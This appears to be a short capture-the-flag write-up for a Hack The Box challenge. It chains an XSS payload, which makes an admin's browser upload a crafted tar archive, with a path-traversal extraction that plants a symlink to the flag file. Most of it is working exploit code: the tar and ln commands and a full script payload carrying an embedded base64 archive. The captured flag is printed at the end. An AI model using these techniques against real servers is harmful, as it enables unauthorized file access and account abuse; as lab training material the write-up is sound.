Stacked with xss from admin


Looking at the downloaded source code we can exploit how it moves the files to the final location to allow for uploading files anywhere
```bash
tar -czvf symlink.tar.gz -P "../app/application/static/flag.txt"
```
The `-P` flag preserves the file path with the `../` included, so when the server extracts it, a new symlink is created under the static directory to give us access to the flag

The flag symlink was created using
```bash
ln -s /flag.txt flag.txt
```

The issue to xss for submission
```html
<script>
// https://stackoverflow.com/a/16245768/5299903
let b64toBlob = (b64Data, contentType='', sliceSize=512) => {
  const byteCharacters = atob(b64Data);
  const byteArrays = [];

  for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
    const slice = byteCharacters.slice(offset, offset + sliceSize);

    const byteNumbers = new Array(slice.length);
    for (let i = 0; i < slice.length; i++) {
      byteNumbers[i] = slice.charCodeAt(i);
    }

    const byteArray = new Uint8Array(byteNumbers);
    byteArrays.push(byteArray);
  }

  const blob = new Blob(byteArrays, {type: contentType});
  return blob;
}

// https://stackoverflow.com/a/51527250/5299903
var blob = b64toBlob("H4sIAAAAAAAAA+3PTQrCQAyG4RxlTjB/NOY8Q0EplFrqCHp7ZxaCm+pCcfU+EL7Fl0XifSjr2meexlKn8xIuteUYjnM5+Xqr8rXYmFnPZBpf80nSkIeoOR1Mpbeq4vIPb9h1be9uzsl2L8u7vU89AAAAAAAAAAAAAAAAAAB/9ADONpqYACgAAA==")
var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/firmware/upload', true);

var formData = new FormData();
formData.append('file', blob, 'firmware.tar.gz');

xhr.send(formData);
</script>
```

```
GET /static/flag.txt
```
```
HTB{des3r1aliz3_4ll_th3_th1ngs}
```
